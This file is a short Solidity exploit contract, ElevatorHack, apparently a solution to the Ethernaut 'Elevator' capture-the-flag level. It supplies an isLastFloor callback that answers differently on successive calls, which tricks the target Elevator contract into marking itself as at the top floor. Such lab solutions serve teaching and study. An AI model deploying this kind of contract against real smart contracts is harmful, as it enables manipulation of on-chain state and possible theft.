// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

error NotTopFloor();

contract ElevatorHack {
    Elevator private immutable target;

    uint256 private count;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(69);
        if (!target.top()) revert NotTopFloor();
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;
    }
}
